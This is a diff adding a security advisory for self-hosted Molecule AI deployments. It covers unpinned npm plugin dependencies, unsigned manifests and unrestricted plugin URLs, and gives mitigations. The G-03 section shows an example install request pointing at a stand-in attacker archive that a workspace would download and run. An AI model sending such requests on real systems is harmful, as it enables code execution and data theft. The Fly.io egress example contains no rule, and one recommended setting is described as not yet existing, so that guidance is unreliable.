@@ -1,0 +1,200 @@
+---
+title: SAFE-MCP Security Advisory (2026-04-17)
+description: High-severity findings from the SAFE-MCP audit and recommended mitigations for self-hosted deployments.
+---
+
+## Advisory overview
+
+This advisory documents three HIGH-severity findings from the SAFE-MCP
+security audit performed on the Molecule AI platform in April 2026. All three
+affect **self-hosted** deployments. If you are using the SaaS offering at
+`moleculesai.app`, mitigations are applied server-side — no action needed.
+
+**Published:** April 17, 2026
+**Severity:** HIGH (G-01, G-02, G-03)
+**Affected versions:** All self-hosted deployments prior to the fixes shipped
+in PRs #808 and associated plugin updates.
+**Fixed in:** `molecule-monorepo` PRs #808 (platform), #809 (plugin scaffold).
+
+---
+
+## G-01: Unpinned npm MCP packages — HIGH
+
+### Description
+
+The workspace plugin scaffold (`plugins/molecule-ai-plugin-*/package.json`) uses
+unpinned version ranges for npm dependencies:
+
+```json
+"dependencies": {
+  "@anthropic-ai/sdk": "^0.32.0"
+}
+```
+
+The caret (`^`) range means `npm install` can resolve to any compatible version,
+including versions with known vulnerabilities or a malicious `next` release
+published after the audit date.
+
+### Risk
+
+- Supply chain compromise if a package maintainer publishes a malicious version
+- Silent dependency drift as `npm install` pulls newer patch/minor versions
+- Potential conflicts with workspace-runtime's own dependency tree
+
+### Recommended mitigation
+
+Pin all npm dependencies to exact versions before deploying:
+
+```bash
+# In each plugin directory
+npm install --save-exact @anthropic-ai/sdk@0.32.1
+npm install --save-exact <other-deps>
+```
+
+Add an `.npmrc` to enforce pinned installs:
+
+```ini
+save-exact=true
+```
+
+Commit `package-lock.json` and verify CI installs from the lockfile:
+
+```bash
+npm ci  # instead of npm install
+```
+
+For the platform build, ensure `npm ci` is used in CI rather than `npm install`
+to respect the lockfile.
+
+---
+
+## G-02: No manifest signing — HIGH
+
+### Description
+
+Plugin manifests (`manifest.json`) are served by the platform and executed by
+workspace containers without cryptographic verification. There is no mechanism
+to confirm that the manifest has not been tampered with after it was published
+by the plugin author.
+
+### Risk
+
+- An attacker with write access to the plugin source repository (or the CDN
+  serving it) could modify `manifest.json` to:
+  - Inject additional tools that exfiltrate secrets from the workspace
+  - Redirect API calls to a malicious endpoint
+  - Add an attacker-controlled `entrypoint` path
+
+### Recommended mitigation
+
+**短期 (short-term):** Inspect `manifest.json` files for all plugins before
+enabling them. Verify the `author`, `version`, and `entrypoint` are from a
+trusted source. Do not enable plugins from untrusted or unknown authors.
+
+**长期 (long-term):** The platform will add manifest signing using an
+Ed25519 key pair. Plugin authors will sign their manifests; the platform will
+verify signatures before serving or executing manifests. Track progress in
+`molecule-monorepo` issue tracker.
+
+Until signing is available, treat plugin manifests as untrusted input.
+
+---
+
+## G-03: Floating plugin references — HIGH
+
+### Description
+
+Workspaces can install plugins by referencing any publicly accessible URL:
+
+```bash
+POST /workspaces/:id/plugins
+{
+  "source": "https://github.com/attacker/malicious-plugin/archive/refs/heads/main.tar.gz"
+}
+```
+
+There is no allowlist, no integrity check, and no review gate on the plugin
+URL before the workspace downloads and executes code from it.
+
+### Risk
+
+- Confidential workspace data (secrets, memory, files) is sent to attacker-controlled servers
+- Arbitrary code execution within the workspace container
+- Lateral movement from the workspace container to internal services
+
+### Recommended mitigations
+
+**1. Restrict plugin installation in your deployment config:**
+
+Add a platform-level environment variable to allow only approved plugin sources.
+Until this variable exists, enforce it at the network layer (see below).
+
+**2. Network-level egress filtering:**
+
+Block outbound traffic from workspace containers to all IPs except the
+platform API and required external services (LLM providers, vector DBs, etc.).
+Workspace containers should not be able to reach arbitrary GitHub archives or
+external plugin URLs directly.
+
+Example Fly.io `fly.toml` rule:
+
+```toml
+[[vm]]
+  auto_destroy = false
+
+# App-level egress rules (Fly Private Network)
+```
+
+Or use a Kubernetes `NetworkPolicy`:
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: workspace-egress-lockdown
+spec:
+  podSelector:
+    matchLabels:
+      component: workspace
+  policyTypes:
+    - Egress
+  egress:
+    - to:
+        - podSelector: {}
+      ports:
+        - port: 8080  # platform API
+    - to:
+        - namespaceSelector: {}
+          podSelector:
+            matchLabels:
+              app: redis
+      ports:
+        - port: 6379
+    # Block all other egress
+```
+
+**3. Plugin allowlist (platform-level):**
+
+Set `PLUGIN_ALLOW_UNPINNED=false` in your environment to reject any plugin
+install requests that reference unpinned or unverified sources.
+
+---
+
+## Remediation checklist for self-hosted operators
+
+- [ ] Audit all plugin `package.json` files — pin all dependencies to exact versions
+- [ ] Verify CI/CD uses `npm ci` not `npm install`
+- [ ] Commit and push `package-lock.json` for all plugins
+- [ ] Add `.npmrc save-exact=true` to all plugin directories
+- [ ] Inspect `manifest.json` for any enabled plugin before use
+- [ ] Block workspace egress to non-approved hosts at the network level
+- [ ] Set `PLUGIN_ALLOW_UNPINNED=false` (when available)
+- [ ] Watch `molecule-monorepo` for the manifest-signing feature
+
+---
+
+## Reporting security issues
+
+If you discover a new security issue in Molecule AI, please report it via
+GitHub Security Advisories on `Molecule-AI/molecule-monorepo` or contact the
+security team through your support channel.
